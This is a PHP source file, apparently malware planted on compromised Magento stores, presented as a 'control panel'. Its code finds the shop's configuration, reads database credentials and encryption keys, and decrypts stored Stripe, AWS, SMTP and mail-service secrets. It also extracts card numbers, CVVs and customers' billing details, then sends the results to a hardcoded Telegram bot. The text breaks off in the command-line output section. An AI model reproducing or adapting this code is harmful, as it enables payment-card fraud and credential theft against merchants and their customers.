<?php
/**
 * Magento Control Panel - Ultimate Edition
 * VENI VIDI VICI
 * 
 * Features:
 * - Order & Revenue Statistics
 * - Credential Harvester (Stripe, AWS, SMTP)
 * - Credit Card Decryptor
 * - Command Execution
 * 
 * Dual Mode: CLI + Web GUI
 * CLI Usage: php magez.php
 * Web Usage: Access via browser
 */

error_reporting(0);
ini_set('display_errors', 0);
ini_set('memory_limit', '512M');

$isCLI = (php_sapi_name() === 'cli');

// ============================================
// TELEGRAM CONFIG
// ============================================
$tg_bot_token = '8434935750:AAEzRdUUXxQWlLosrbLmVgYNMN--8anMzNQ';
$tg_chat_id = '-5057844746';

function send_telegram($msg, $file_path = null) {
    global $tg_bot_token, $tg_chat_id;
    if (empty($tg_bot_token) || $tg_bot_token === 'ENTER_BOT_TOKEN_HERE') return;

    if ($msg) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendMessage";
        $data = ['chat_id' => $tg_chat_id, 'text' => $msg, 'parse_mode' => 'HTML'];
        
        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
                'timeout' => 10
            ]
        ];
        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
    }

    if ($file_path && file_exists($file_path)) {
        $url = "https://api.telegram.org/bot$tg_bot_token/sendDocument";
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            $cfile = new CURLFile($file_path);
            $data = ['chat_id' => $tg_chat_id, 'document' => $cfile];
            
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
            curl_exec($ch);
            curl_close($ch);
        }
    }
}

// ============================================
// AUTO-DETECT MAGENTO ROOT (Enhanced)
// ============================================
function findMagentoRoot() {
    // Method 1: Relative path traversal (up to 15 levels)
    for ($i = 0; $i <= 15; $i++) {
        $prefix = str_repeat('../', $i);
        
        if (file_exists($prefix . 'app/etc/env.php')) {
            return [
                'root' => realpath($prefix),
                'version' => 'M2',
                'config_file' => realpath($prefix . 'app/etc/env.php')
            ];
        }
        
        if (file_exists($prefix . 'app/etc/local.xml')) {
            return [
                'root' => realpath($prefix),
                'version' => 'M1',
                'config_file' => realpath($prefix . 'app/etc/local.xml')
            ];
        }
    }
    
    // Method 2: DOCUMENT_ROOT variations
    $doc_roots = [];
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $doc_roots[] = $_SERVER['DOCUMENT_ROOT'];
        $doc_roots[] = dirname($_SERVER['DOCUMENT_ROOT']);
        $doc_roots[] = dirname(dirname($_SERVER['DOCUMENT_ROOT']));
    }
    
    // Method 3: Common absolute paths
    $common_paths = [
        '/var/www/html',
        '/var/www/magento',
        '/var/www/magento2',
        '/var/www',
        '/home/magento/public_html',
        '/home/magento',
        '/usr/share/nginx/html',
        '/opt/magento',
        dirname(__FILE__)
    ];
    
    $all_paths = array_merge($doc_roots, $common_paths);
    
    foreach ($all_paths as $path) {
        if (empty($path)) continue;
        
        // Check direct path
        if (file_exists($path . '/app/etc/env.php')) {
            return [
                'root' => realpath($path),
                'version' => 'M2',
                'config_file' => realpath($path . '/app/etc/env.php')
            ];
        }
        if (file_exists($path . '/app/etc/local.xml')) {
            return [
                'root' => realpath($path),
                'version' => 'M1',
                'config_file' => realpath($path . '/app/etc/local.xml')
            ];
        }
        
        // Check parent directories
        for ($i = 0; $i < 3; $i++) {
            $parent = dirname($path, $i + 1);
            if (file_exists($parent . '/app/etc/env.php')) {
                return [
                    'root' => realpath($parent),
                    'version' => 'M2',
                    'config_file' => realpath($parent . '/app/etc/env.php')
                ];
            }
            if (file_exists($parent . '/app/etc/local.xml')) {
                return [
                    'root' => realpath($parent),
                    'version' => 'M1',
                    'config_file' => realpath($parent . '/app/etc/local.xml')
                ];
            }
        }
    }
    
    return null;
}

$magento = findMagentoRoot();

if (!$magento) {
    if ($isCLI) {
        echo "ERROR: Magento root not found\n";
        exit(1);
    } else {
        die("<h1>Error</h1><p>Magento root not found.</p>");
    }
}

// ============================================
// LOAD DATABASE CREDENTIALS & KEYS
// ============================================
function loadDbCredentials($magento) {
    if ($magento['version'] === 'M2') {
        $env = include($magento['config_file']);
        $dbConf = $env['db']['connection']['default'] ?? [];
        
        return [
            'host' => $dbConf['host'] ?? 'localhost',
            'user' => $dbConf['username'] ?? '',
            'pass' => $dbConf['password'] ?? '',
            'dbname' => $dbConf['dbname'] ?? '',
            'prefix' => $env['db']['table_prefix'] ?? '',
            'env' => $env
        ];
    } else {
        $xml = file_get_contents($magento['config_file']);
        $xml = preg_replace('/<!--(.*?)-->/is', '', $xml);
        
        preg_match('/<host><!\[CDATA\[(.*?)\]\]><\/host>/i', $xml, $host);
        preg_match('/<username><!\[CDATA\[(.*?)\]\]><\/username>/i', $xml, $user);
        preg_match('/<password><!\[CDATA\[(.*?)\]\]><\/password>/i', $xml, $pass);
        preg_match('/<dbname><!\[CDATA\[(.*?)\]\]><\/dbname>/i', $xml, $dbname);
        preg_match('/<table_prefix><!\[CDATA\[(.*?)\]\]><\/table_prefix>/i', $xml, $prefix);
        
        return [
            'host' => $host[1] ?? 'localhost',
            'user' => $user[1] ?? '',
            'pass' => $pass[1] ?? '',
            'dbname' => $dbname[1] ?? '',
            'prefix' => $prefix[1] ?? '',
            'env' => null
        ];
    }
}

$dbCreds = loadDbCredentials($magento);

// Load encryption keys
$keys = [];
if ($magento['version'] === 'M2' && isset($dbCreds['env']['crypt']['key'])) {
    $keys[] = $dbCreds['env']['crypt']['key'];
}
$dir = dirname($magento['config_file']);
foreach (glob($dir . '/env*.php*') as $f) {
    if ($f == $magento['config_file']) continue;
    $c = file_get_contents($f);
    if (preg_match("/'key'\s*=>\s*'([^']+)'/", $c, $m)) $keys[] = $m[1];
}
$keys = array_unique($keys);

// ============================================
// DATABASE CONNECTION
// ============================================
$conn = null;
$pdo = null;

try {
    $conn = new mysqli(
        $dbCreds['host'],
        $dbCreds['user'],
        $dbCreds['pass'],
        $dbCreds['dbname']
    );
    
    if ($conn->connect_error) {
        throw new Exception($conn->connect_error);
    }
    
    $conn->set_charset('utf8');
    
    // PDO for advanced queries
    $dsn = "mysql:host={$dbCreds['host']};dbname={$dbCreds['dbname']};charset=utf8";
    $pdo = new PDO($dsn, $dbCreds['user'], $dbCreds['pass'], [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
    ]);
    
} catch (Exception $e) {
    if ($isCLI) {
        echo "DB Connection Failed: " . $e->getMessage() . "\n";
        exit(1);
    } else {
        die("<h1>Error</h1><p>Database connection failed: " . htmlspecialchars($e->getMessage()) . "</p>");
    }
}

// ============================================
// DECRYPT FUNCTIONS
// ============================================
if (!defined('SODIUM_CRYPTO_SECRETBOX_KEYBYTES')) define('SODIUM_CRYPTO_SECRETBOX_KEYBYTES', 32);
if (!defined('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES')) define('SODIUM_CRYPTO_SECRETBOX_NONCEBYTES', 24);

function standalone_sodium_decrypt($encrypted_full, $key) {
    if (!function_exists('sodium_crypto_secretbox_open')) return false;
    $parts = explode(':', $encrypted_full);
    if (count($parts) < 3) return false;
    $payload = base64_decode(end($parts));
    if (!$payload || strlen($payload) < SODIUM_CRYPTO_SECRETBOX_NONCEBYTES) return false;
    $nonce = substr($payload, 0, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    $msg = substr($payload, SODIUM_CRYPTO_SECRETBOX_NONCEBYTES);
    
    $candidates = [];
    
    if (strlen($key) == 32 && ctype_xdigit($key)) {
        $hex_bytes = hex2bin($key);
        
        if (function_exists('hash_hkdf')) {
            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', '');
            $candidates[] = hash_hkdf('sha256', $hex_bytes, 32, '', $key);
        }
        
        $candidates[] = $hex_bytes . $hex_bytes;
        $candidates[] = str_pad($hex_bytes, 32, "\0");
        
        if (function_exists('hash_hkdf')) {
            $candidates[] = hash_hkdf('sha256', $key, 32, '', '');
        }
    }
    
    if (strlen($key) == 64 && ctype_xdigit($key)) {
        $candidates[] = hex2bin($key);
    }
    
    $candidates[] = $key;
    $candidates[] = md5($key);
    $candidates[] = substr($key, 0, 32);
    
    foreach ($candidates as $k) {
        if (!is_string($k) || strlen($k) !== SODIUM_CRYPTO_SECRETBOX_KEYBYTES) continue;
        try {
            $pt = sodium_crypto_secretbox_open($msg, $nonce, $k);
            if ($pt !== false) return $pt;
        } catch (Exception $e) {}
    }
    return false;
}

function standalone_mcrypt_decrypt($value, $key) {
    if (!function_exists('mcrypt_decrypt')) return false;
    $pt = @mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $value, MCRYPT_MODE_ECB);
    return rtrim($pt, "\0");
}

function smart_decrypt($value, $keys) {
    if (!is_string($value)) {
        error_log("WARNING: smart_decrypt received non-string: " . gettype($value));
        $value = (string)$value;
    }
    
    if (!$value || trim($value) === '' || $value === '0' || $value === '1') {
        return '';
    }
    
    // Try using Magento's native decryption first (most reliable)
    static $magento_encryptor = null;
    if ($magento_encryptor === null) {
        try {
            global $magento;
            $bootstrap_path = dirname($magento['config_file']) . '/../../app/bootstrap.php';
            if (file_exists($bootstrap_path)) {
                require_once $bootstrap_path;
                $bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $_SERVER);
                $obj = $bootstrap->getObjectManager();
                $magento_encryptor = $obj->get('\Magento\Framework\Encryption\EncryptorInterface');
            }
        } catch (Exception $e) {
            $magento_encryptor = false;
        }
    }
    
    // Use Magento's native decryptor if available
    if ($magento_encryptor !== false && is_object($magento_encryptor)) {
        try {
            if (!is_string($value)) {
                $value = (string)$value;
            }
            
            if (strlen($value) > 5 && $value !== '0' && $value !== '1' && strpos($value, ':') !== false) {
                set_error_handler(function() { return true; });
                $decrypted = @$magento_encryptor->decrypt($value);
                restore_error_handler();
                
                if ($decrypted && $decrypted !== $value && is_string($decrypted)) {
                    return $decrypted;
                }
            }
        } catch (Exception $e) {
        } catch (TypeError $e) {
        } catch (Error $e) {
        }
    }
    
    // Fallback to standalone decryption
    foreach ($keys as $k) {
        if (strpos($value, ':3:') !== false || preg_match('/^0:3:/', $value)) {
            $pt = standalone_sodium_decrypt($value, $k);
            if ($pt && $pt !== $value) return $pt;
        }
        if (strpos($value, ':') === false || preg_match('/^0:2:/', $value)) {
            $pt = standalone_mcrypt_decrypt($value, $k);
            if ($pt && $pt !== $value) return $pt;
        }
    }
    return $value;
}

// ============================================
// GET HOSTNAME
// ============================================
$host_name = php_uname('n');
if (isset($_SERVER['HTTP_HOST']) && $_SERVER['HTTP_HOST'] !== 'localhost') {
    $host_name = $_SERVER['HTTP_HOST'];
} else {
    try {
        $cfg_sql = "SELECT value FROM " . $dbCreds['prefix'] . "core_config_data WHERE path = 'web/unsecure/base_url' LIMIT 1";
        $cfg_stmt = $pdo->query($cfg_sql);
        $base_url = $cfg_stmt->fetchColumn();
        if ($base_url) {
            $parsed = parse_url($base_url);
            if (isset($parsed['host'])) $host_name = $parsed['host'];
        }
    } catch (Exception $e) {}
}

$server_ip = gethostbyname($host_name);
if (isset($_SERVER['SERVER_ADDR'])) $server_ip = $_SERVER['SERVER_ADDR'];

// ============================================
// FETCH ORDER STATISTICS
// ============================================
function getOrderStats($conn, $prefix, $version, $days) {
    $table = ($version === 'M2') ? 'sales_order' : 'sales_flat_order';
    $paymentTable = ($version === 'M2') ? 'sales_order_payment' : 'sales_flat_order_payment';
    
    $query = "SELECT 
                COUNT(*) as order_count,
                SUM(base_grand_total) as total_revenue,
                AVG(base_grand_total) as avg_order
              FROM `{$prefix}{$table}` 
              WHERE created_at > DATE_SUB(NOW(), INTERVAL {$days} DAY)";
    
    $result = $conn->query($query);
    $stats = $result->fetch_assoc();
    
    $query2 = "SELECT p.method, COUNT(*) as count, SUM(o.base_grand_total) as revenue
               FROM `{$prefix}{$table}` o
               JOIN `{$prefix}{$paymentTable}` p ON o.entity_id = p.parent_id
               WHERE o.created_at > DATE_SUB(NOW(), INTERVAL {$days} DAY)
               GROUP BY p.method
               ORDER BY count DESC";
    
    $result2 = $conn->query($query2);
    $methods = [];
    while ($row = $result2->fetch_assoc()) {
        $methods[] = $row;
    }
    
    return [
        'count' => (int)$stats['order_count'],
        'revenue' => (float)$stats['total_revenue'],
        'avg' => (float)$stats['avg_order'],
        'methods' => $methods
    ];
}

$stats1d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 1);
$stats7d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 7);
$stats30d = getOrderStats($conn, $dbCreds['prefix'], $magento['version'], 30);

// ============================================
// HANDLE WEB GUI ACTIONS
// ============================================
$action_result = null;

// Load previous results ONLY if "Show Preview" button is clicked
if (!$isCLI && !isset($_POST['action'])) {
    $grab_result_file = __DIR__ . '/.last_grab_result.txt';
    $decrypt_result_file = __DIR__ . '/.last_decrypt_result.txt';
    
    // Only load if ?show=grab or ?show=decrypt is present (from clicking "Show Preview")
    if (isset($_GET['show']) && $_GET['show'] === 'grab' && file_exists($grab_result_file)) {
        $saved = json_decode(file_get_contents($grab_result_file), true);
        if ($saved && (time() - $saved['timestamp']) < 86400) {
            $action_result = $saved;
        }
    }
    
    if (isset($_GET['show']) && $_GET['show'] === 'decrypt' && file_exists($decrypt_result_file)) {
        $saved = json_decode(file_get_contents($decrypt_result_file), true);
        if ($saved && (time() - $saved['timestamp']) < 86400) {
            $action_result = $saved;
        }
    }
}

if (!$isCLI && isset($_POST['action'])) {
    $action = $_POST['action'];
    
    // ============================================
    // ACTION: GRAB CREDENTIALS
    // ============================================
    if ($action === 'grab_creds') {
        $results = [];
        
        $search_queries = [
            "SELECT path, value, 'Stripe' as category FROM " . $dbCreds['prefix'] . "core_config_data 
             WHERE path LIKE '%stripe%' 
                OR path LIKE '%sk_live%' 
                OR path LIKE '%pk_live%' 
                OR value LIKE 'sk_live_%' 
                OR value LIKE 'pk_live_%'
                OR value LIKE 'sk_test_%' 
                OR value LIKE 'pk_test_%'",
            
            "SELECT path, value, 'AWS_SES' as category FROM " . $dbCreds['prefix'] . "core_config_data 
             WHERE (path LIKE '%smtp%' AND (path LIKE '%host%' OR path LIKE '%username%' OR path LIKE '%password%' OR path LIKE '%auth%' OR path LIKE '%port%' OR path LIKE '%from%'))
                OR path LIKE '%trans_email/ident_general/email%'
                OR path LIKE '%aws%' 
                OR path LIKE '%ses%access%'
                OR path LIKE '%ses%secret%'
                OR path LIKE '%ses%region%'
                OR value LIKE 'AKIA%'
                OR value LIKE '%smtp.%'
                OR value LIKE '%mail.%'",
            
            "SELECT path, value, 'Postmark' as category FROM " . $dbCreds['prefix'] . "core_config_data 
             WHERE path LIKE '%postmark%' 
                OR value LIKE '%postmarkapp.com%'",
            
            "SELECT path, value, 'SendGrid' as category FROM " . $dbCreds['prefix'] . "core_config_data 
             WHERE path LIKE '%sendgrid%' 
                OR value LIKE 'SG.%'
                OR value LIKE '%sendgrid.net%'",
        ];
        
        $all_rows = [];
        foreach ($search_queries as $query) {
            try {
                $stmt = $pdo->query($query);
                $rows = $stmt->fetchAll();
                $all_rows = array_merge($all_rows, $rows);
            } catch (Exception $e) {}
        }
        
        $unique_rows = [];
        $seen_paths = [];
        foreach ($all_rows as $row) {
            if (!isset($seen_paths[$row['path']])) {
                $unique_rows[] = $row;
                $seen_paths[$row['path']] = true;
            }
        }
        
        foreach ($unique_rows as $row) {
            $path = $row['path'];
            $value = (string)$row['value'];
            $category = $row['category'] ?? 'Unknown';
            
            if (!$value || trim($value) === '' || $value === '0' || $value === 'false') continue;
            
            $path_parts = explode('/', $path);
            $label = end($path_parts);
            $label = str_replace('_', ' ', $label);
            $label = ucwords($label);
            
            $decrypted = smart_decrypt($value, $keys);
            
            if ($decrypted && !mb_check_encoding($decrypted, 'UTF-8')) {
                if (strlen($decrypted) < 10 || !ctype_print(str_replace([' ', "\t", "\n", "\r"], '', $decrypted))) {
                    $decrypted = $value;
                }
            }
            
            if ($decrypted !== $value && strpos($decrypted, ':') !== false && !preg_match('/^[a-zA-Z0-9_\-\.@]+/', $decrypted)) {
                $decrypted = $value;
            }
            
            $results[] = [
                'label' => $label,
                'path' => $path,
                'category' => $category,
                'raw' => $value,
                'decrypted' => $decrypted,
                'is_encrypted' => ($decrypted !== $value && strpos($value, ':') !== false)
            ];
        }
        
        // Format output (same as grab.php)
        $output = "";
        $output .= str_repeat("=", 60) . "\n";
        $output .= " MAGENTO CREDENTIAL HARVEST RESULTS\n";
        $output .= " BOB MARLEY LABS\n";
        $output .= str_repeat("=", 60) . "\n\n";
        $output .= "Host: $host_name\n";
        $output .= "IP: $server_ip\n";
        $output .= "Date: " . date('Y-m-d H:i:s') . "\n\n";
        $output .= str_repeat("=", 60) . "\n\n";
        
        $stripe_keys = [];
        $aws_ses = [];
        $postmark = [];
        $sendgrid = [];
        $smtp_generic = [];
        
        foreach ($results as $r) {
            $val = $r['decrypted'];
            $category = $r['category'];
            $path = $r['path'];
            
            if ($category === 'Stripe' || strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0) {
                $stripe_keys[] = $r;
            } elseif ($category === 'AWS_SES' || strpos($val, 'AKIA') === 0 || strpos($path, 'aws') !== false || strpos($path, 'ses') !== false) {
                $aws_ses[] = $r;
            } elseif ($category === 'Postmark' || strpos($val, 'postmark') !== false || strpos($path, 'postmark') !== false) {
                $postmark[] = $r;
            } elseif ($category === 'SendGrid' || strpos($val, 'SG.') === 0 || strpos($path, 'sendgrid') !== false) {
                $sendgrid[] = $r;
            } else {
                if (strpos($path, 'smtp') !== false || strpos($path, 'mail') !== false) {
                    $smtp_generic[] = $r;
                }
            }
        }
        
        $has_smtp = false;
        $has_aws = false;
        
        if (!empty($stripe_keys)) {
            $output .= "[STRIPE KEYS]\n";
            $output .= str_repeat("-", 60) . "\n";
            foreach ($stripe_keys as $r) {
                $val = $r['decrypted'];
                if (strlen($val) > 3 && (strpos($val, 'sk_') === 0 || strpos($val, 'pk_') === 0 || in_array($val, ['test', 'live']))) {
                    $output .= sprintf("%-20s: %s\n", $r['label'], $val);
                }
            }
            $output .= "\n";
        }
        
        if (!empty($aws_ses)) {
            $smtp_config = [
                'host' => '',
                'port' => '',
                'username' => '',
                'password' => '',
                'from_email' => '',
                'authentication' => '',
                'aws_access_key' => '',
                'aws_secret_key' => '',
                'aws_region' => ''
            ];
            
            foreach ($aws_ses as $r) {
                $val = $r['decrypted'];
                $path = strtolower($r['path']);
                
                if (strpos($path, 'host') !== false && strpos($path, 'smtp') !== false) {
                    $smtp_config['host'] = $val;
                } elseif (strpos($path, 'port') !== false && (strpos($path, 'smtp') !== false || is_numeric($val))) {
                    $smtp_config['port'] = $val;
                } elseif (strpos($path, 'username') !== false && strpos($path, 'smtp') !== false) {
                    $smtp_config['username'] = $val;
                } elseif (strpos($path, 'password') !== false && strpos($path, 'smtp') !== false) {
                    $smtp_config['password'] = $val;
                } elseif (strpos($path, 'authentication') !== false || (strpos($path, 'auth') !== false && strpos($path, 'smtp') !== false)) {
                    $smtp_config['authentication'] = $val;
                } elseif (strpos($path, 'access_key') !== false || strpos($val, 'AKIA') === 0) {
                    $smtp_config['aws_access_key'] = $val;
                } elseif (strpos($path, 'secret_key') !== false) {
                    $smtp_config['aws_secret_key'] = $val;
                } elseif (strpos($path, 'region') !== false && strpos($path, 'aws') !== false) {
                    $smtp_config['aws_region'] = $val;
                } elseif (strpos($val, '@') !== false && filter_var($val, FILTER_VALIDATE_EMAIL)) {
                    if (strpos($path, 'trans_email/ident_general/email') !== false || 
                        strpos($path, 'smtp') !== false && strpos($path, 'from') !== false) {
                        if (!$smtp_config['from_email']) {
                            $smtp_config['from_email'] = $val;
                        }
                    }
                }
            }
            
            if (!$smtp_config['from_email']) {
                foreach ($aws_ses as $r) {
                    $val = $r['decrypted'];
                    if (strpos($val, '@') !== false && filter_var($val, FILTER_VALIDATE_EMAIL)) {
                        $smtp_config['from_email'] = $val;
                        break;
                    }
                }
            }
            
            $has_smtp = $smtp_config['host'] || $smtp_config['username'] || $smtp_config['password'];
            $has_aws = $smtp_config['aws_access_key'] || $smtp_config['aws_secret_key'];
            
            if ($has_smtp || $has_aws) {
                $output .= "[SMTP / AWS SES CREDENTIALS]\n";
                $output .= str_repeat("-", 60) . "\n";
                
                if ($smtp_config['host']) {
                    $output .= sprintf("%-20s: %s\n", "Host", $smtp_config['host']);
                }
                if ($smtp_config['port']) {
                    $output .= sprintf("%-20s: %s\n", "Port", $smtp_config['port']);
                }
                if ($smtp_config['username']) {
                    $output .= sprintf("%-20s: %s\n", "Username", $smtp_config['username']);
                }
                if ($smtp_config['password']) {
                    $output .= sprintf("%-20s: %s\n", "Password", $smtp_config['password']);
                }
                if ($smtp_config['from_email']) {
                    $output .= sprintf("%-20s: %s\n", "From Email", $smtp_config['from_email']);
                }
                if ($smtp_config['authentication']) {
                    $output .= sprintf("%-20s: %s\n", "Authentication", $smtp_config['authentication']);
                }
                
                if ($smtp_config['aws_access_key']) {
                    $output .= "\n";
                    $output .= sprintf("%-20s: %s\n", "AWS Access Key", $smtp_config['aws_access_key']);
                }
                if ($smtp_config['aws_secret_key']) {
                    $output .= sprintf("%-20s: %s\n", "AWS Secret Key", $smtp_config['aws_secret_key']);
                }
                if ($smtp_config['aws_region']) {
                    $output .= sprintf("%-20s: %s\n", "AWS Region", $smtp_config['aws_region']);
                }
                
                $output .= "\n";
            }
        }
        
        if (!empty($postmark)) {
            $output .= "[POSTMARK SMTP]\n";
            $output .= str_repeat("-", 60) . "\n";
            foreach ($postmark as $r) {
                $val = $r['decrypted'];
                if (strlen($val) > 2) {
                    $output .= sprintf("%-20s: %s\n", $r['label'], $val);
                }
            }
            $output .= "\n";
        }
        
        if (!empty($sendgrid)) {
            $output .= "[SENDGRID SMTP]\n";
            $output .= str_repeat("-", 60) . "\n";
            foreach ($sendgrid as $r) {
                $val = $r['decrypted'];
                if (strlen($val) > 2) {
                    $output .= sprintf("%-20s: %s\n", $r['label'], $val);
                }
            }
            $output .= "\n";
        }
        
        if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
            $output .= "[NO CREDENTIALS FOUND]\n";
            $output .= str_repeat("-", 60) . "\n";
            $output .= "No payment gateway or SMTP credentials found in database.\n";
            $output .= "This site may use default settings or external mail services.\n\n";
        }
        
        $output .= str_repeat("=", 60) . "\n";
        $output .= "Total Entries: " . count($results) . "\n";
        
        // Save to file
        $clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
        $outFile = __DIR__ . '/' . $clean_host . '-credentials.txt';
        file_put_contents($outFile, $output);
        
        // Send to Telegram
        if (empty($stripe_keys) && empty($postmark) && empty($sendgrid) && !$has_smtp && !$has_aws) {
            send_telegram("WARNING: No Credentials Found\n\nHost: $host_name\nIP: $server_ip\n\nNo payment gateway or SMTP credentials found in database.");
        } else {
            send_telegram("✅ Credential Harvest Complete\n\nHost: $host_name\nIP: $server_ip\nFound: " . count($results) . " entries", $outFile);
        }
        
        // Save result to session file for persistence
        $result_file = __DIR__ . '/.last_grab_result.txt';
        file_put_contents($result_file, json_encode([
            'type' => 'grab_creds',
            'success' => true,
            'content' => $output,
            'file' => $outFile,
            'timestamp' => time()
        ]));
        
        $action_result = [
            'type' => 'grab_creds',
            'success' => true,
            'content' => $output,
            'file' => $outFile
        ];
        
        // Redirect to persist preview
        header("Location: " . $_SERVER['PHP_SELF'] . "?show=grab");
        exit;
    }
    
    // ============================================
    // ACTION: DECRYPT CC/PAYMENT DATA
    // ============================================
    if ($action === 'decrypt_cc') {
        $tbl_payment = $dbCreds['prefix'] . 'sales_order_payment';
        $tbl_order = $dbCreds['prefix'] . 'sales_order';
        $tbl_addr = $dbCreds['prefix'] . 'sales_order_address';
        
        $sql = "
        SELECT
            so.increment_id,
            so.created_at,
            so.customer_email,
            so.remote_ip,
            so.entity_id as parent_id,
            sop.* 
        FROM {$tbl_payment} sop
        JOIN {$tbl_order} so ON so.entity_id = sop.parent_id
        ORDER BY so.created_at DESC
        LIMIT 50000
        ";
        
        $stmt = $pdo->query($sql);
        $rows = $stmt->fetchAll();
        
        $clean_host = preg_replace('/[^a-zA-Z0-9.-]/', '_', $host_name);
        $outFile = __DIR__ . '/' . $clean_host . '-cc.txt';
        $fp = fopen($outFile, 'a'); 
        
        fwrite($fp, "--- NEW SCAN SESSION " . date('Y-m-d H:i:s') . " ---\n");
        
        $found_count = 0;
        
        foreach ($rows as $r) {
            $pan = null;
            $cvv = null;
            
            $info = [];
            if (!empty($r['additional_information'])) {
                $json = json_decode($r['additional_information'], true);
                if (is_array($json)) $info = array_merge($info, $json);
            }
            if (!empty($r['additional_data'])) {
                $json = json_decode($r['additional_data'], true);
                if (!$json) $json = @unserialize($r['additional_data']);
                if (is_array($json)) $info = array_merge($info, $json);
            }
            
            foreach ($info as $k => $v) {
                if (is_string($v) || is_numeric($v)) {
                    $clean = preg_replace('/[^0-9]/', '', $v);
                    if (preg_match('/^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6(?:011|5[0-9]{2})[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/', $clean)) {
                        $pan = $clean;
                        break; 
                    }
                    
                    if (strpos($v, ':') !== false || strlen($v) > 20) {
                        $dec = smart_decrypt($v, $keys);
                        if ($dec && preg_match('/^\d{13,19}$/', $dec)) {
                            $pan = $dec;
                            break;
                        }
                    }
                }
            }
            
            if (!$pan) {
                $enc_candidates = [];
                if (!empty($r['cc_number_enc'])) $enc_candidates[] = $r['cc_number_enc'];
                $keys_to_check = ['cc_number_enc', 'cc_number', 'number', 'cc_num'];
                foreach ($keys_to_check as $k) {
                    if (isset($info[$k]) && !is_array($info[$k])) $enc_candidates[] = $info[$k];
                }
                
                foreach ($enc_candidates as $enc) {
                    $dec = smart_decrypt($enc, $keys);
                    if ($dec && preg_match('/^\d{13,19}$/', $dec)) {
                        $pan = $dec;
                        break;
                    }
                }
            }
            
            if (!$pan && !empty($r['cc_last_4'])) {
                $pan = "************" . $r['cc_last_4'];
            }
            
            if (!$pan || strlen($pan) < 13 || preg_match('/[^\d*]/', $pan)) continue;
            
            $cvv_keys = [
                'cc_cid_enc', 'cc_cid', 'cid', 'cvv', 'cvc', 'cc_cvv', 'verification_value', 
                'cvv2', 'cc_cvv2', 'cvc2', 'moip_cc_cvv', 'card_cvv', 'security_code', 'cc_security_code'
            ];
            
            if (!empty($r['cc_cid_enc'])) {
                $dec = smart_decrypt($r['cc_cid_enc'], $keys);
                if ($dec && preg_match('/^\d{3,4}$/', $dec)) $cvv = $dec;
            }
            
            if (!$cvv) {
                foreach ($cvv_keys as $ck) {
                    if (isset($info[$ck]) && (is_string($info[$ck]) || is_numeric($info[$ck]))) {
                        $val = $info[$ck];
                        if (preg_match('/^\d{3,4}$/', $val)) {
                            $cvv = $val; break;
                        }
                        if (strlen($val) > 10 || strpos($val, ':') !== false) {
                            $dec = smart_decrypt($val, $keys);
                            if ($dec && preg_match('/^\d{3,4}$/', $dec)) { $cvv = $dec; break; }
                        }
                    }
                }
            }
            
            if (!$cvv) $cvv = "";
            
            $exp_m = $r['cc_exp_month'] ?? ($info['cc_exp_month'] ?? '?');
            $exp_y = $r['cc_exp_year'] ?? ($info['cc_exp_year'] ?? '?');
            
            if (is_numeric($exp_m) && (int)$exp_m > 0 && (int)$exp_m <= 12) {
                $exp_m = str_pad($exp_m, 2, '0', STR_PAD_LEFT);
            }
            
            $addr_sql = "SELECT * FROM {$tbl_addr} WHERE parent_id = ? AND address_type = 'billing'";
            $stmt_a = $pdo->prepare($addr_sql);
            $stmt_a->execute([$r['parent_id']]);
            $ba = $stmt_a->fetch() ?: [];
            
            $line = "ORDER={$r['increment_id']} | " .
                    "DATE={$r['created_at']} | " .
                    "METHOD={$r['method']} | " .
                    "PAN={$pan} | " .
                    "CVV={$cvv} | " .
                    "EXP={$exp_m}/{$exp_y} | " .
                    "NAME=" . ($ba['firstname']??'') . " " . ($ba['lastname']??'') . " | " .
                    "ADDRESS=" . str_replace(["\n","\r"], ' ', (string)($ba['street']??'')) . " | " .
                    "CITY=" . ($ba['city']??'') . " | " .
                    "STATE=" . ($ba['region']??'') . " | " .
                    "ZIP=" . ($ba['postcode']??'') . " | " .
                    "COUNTRY=" . ($ba['country_id']??'') . " | " .
                    "PHONE=" . ($ba['telephone']??'') . " | " .
                    "EMAIL={$r['customer_email']} | " .
                    "IP={$r['remote_ip']}";
            
            fwrite($fp, $line . PHP_EOL);
            $found_count++;
        }
        
        fclose($fp);
        
        // Send to Telegram
        if ($found_count > 0) {
            send_telegram("✅ CC Decrypt Complete\n\nHost: $host_name\nIP: $server_ip\nFound: $found_count records", $outFile);
        } else {
            send_telegram("WARNING: No valid credit cards found.");
        }
        
        // Save result to session file for persistence
        $result_file = __DIR__ . '/.last_decrypt_result.txt';
        file_put_contents($result_file, json_encode([
            'type' => 'decrypt_cc',
            'success' => true,
            'count' => $found_count,
            'file' => $outFile,
            'timestamp' => time()
        ]));
        
        $action_result = [
            'type' => 'decrypt_cc',
            'success' => true,
            'count' => $found_count,
            'file' => $outFile
        ];
        
        // Redirect to persist preview
        header("Location: " . $_SERVER['PHP_SELF'] . "?show=decrypt");
        exit;
    }
}

// ============================================
// CLI OUTPUT
// ============================================
if ($isCLI) {
    echo "════════════════════════════════════════════════════════════════\n";
